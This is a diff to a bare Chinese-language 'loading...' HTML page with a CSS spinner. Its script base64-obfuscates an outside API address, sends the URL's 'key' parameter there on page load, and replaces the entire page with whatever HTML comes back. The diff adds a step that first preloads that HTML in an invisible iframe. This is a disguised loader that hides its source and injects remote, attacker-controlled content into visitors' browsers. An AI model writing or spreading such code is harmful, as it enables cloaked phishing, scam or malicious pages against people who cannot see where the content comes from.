@@ -1,68 +1,42 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-  <title>loading...</title>
   <meta charset="utf-8">
+  <title>loading...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      border: 0;
+    *{margin:0;padding:0;border:0}
+    html,body{min-height:100%;background:#f8f8f8}
+    .loading{
+      position:absolute;
+      top:50%;left:50%;
+      width:50px;height:20px;
+      perspective:200px;
+      transform:translate(-50%,-50%);
     }
-    html, body {
-      min-height: 100%;
-      background: #f8f8f8;
-    }
-    .loading {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      width: 50px;
-      height: 20px;
-      perspective: 200px;
-      transform: translate(-50%, -50%);
-    }
-
     .loading::before,
-    .loading::after {
-      content: "";
-      position: absolute;
-      top: 0;
-      width: 20px;
-      height: 20px;
-      background: #000;
-      animation: jumping 0.5s infinite alternate;
+    .loading::after{
+      content:"";
+      position:absolute;
+      top:0;
+      width:20px;height:20px;
+      background:#000;
+      animation:jumping .5s infinite alternate;
     }
-
-    .loading::before {
-      left: 0;
-    }
-
-    .loading::after {
-      right: 0;
-      animation-delay: 0.15s;
-    }
-
-    @keyframes jumping {
-      0% {
-        transform: scale(1) translateY(0) rotateX(0deg);
-        box-shadow: 0 0 0 rgba(0, 0, 0, 0);
-      }
-      100% {
-        transform: scale(1.2) translateY(-25px) rotateX(45deg);
-        box-shadow: 0 25px 40px rgba(0, 0, 0, 0.5);
-      }
+    .loading::before{left:0}
+    .loading::after{right:0;animation-delay:.15s}
+    @keyframes jumping{
+      0%{transform:scale(1) translateY(0) rotateX(0deg);box-shadow:0 0 0 rgba(0,0,0,0)}
+      100%{transform:scale(1.2) translateY(-25px) rotateX(45deg);box-shadow:0 25px 40px rgba(0,0,0,.5)}
     }
   </style>
 </head>
-
 <body>
   <div class="loading"></div>
+
   <script>
-    const apiUrl = "aHR0cDovL2M4OC4xNDQyODgueHl6L2luZGV4X2FwaS5waHA="; 
+    const apiUrl = "aHR0cDovL2M4OC4xNDQyODgueHl6L2luZGV4X2FwaS5waHA=";
 
     function getQueryString(name) {
       const reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
@@ -70,22 +44,35 @@
       return r ? decodeURIComponent(r[2]) : null;
     }
 
-    window.onload = async function() {
+    window.onload = async function () {
       const url = getQueryString("key");
-      const decodedApiUrl = atob(apiUrl); 
+      const decodedApiUrl = atob(apiUrl);
 
       try {
         const response = await fetch(decodedApiUrl, {
-          method: 'POST',
+          method : 'POST',
           headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-          body: `url=${encodeURIComponent(url)}`
+          body   : `url=${encodeURIComponent(url)}`
         });
-
         const data = await response.json();
 
-        setTimeout(() => {
+        /* 方案 A：隐藏 iframe 预加载并等待完全加载完成 */
+        const iframe = document.createElement('iframe');
+        iframe.style.cssText = 'position:absolute;width:0;height:0;border:0;visibility:hidden;';
+        document.body.appendChild(iframe);
+
+        // 写入返回的 HTML
+        iframe.contentDocument.open();
+        iframe.contentDocument.write(data.html);
+        iframe.contentDocument.close();
+
+        // 等 iframe 内部资源全部加载完毕
+        iframe.onload = () => {
+          document.open();
           document.write(data.html);
-        }, 200);
+          document.close();
+          document.body.removeChild(iframe); // 清理无用节点
+        };
 
       } catch (error) {
         console.error('请求失败:', error);
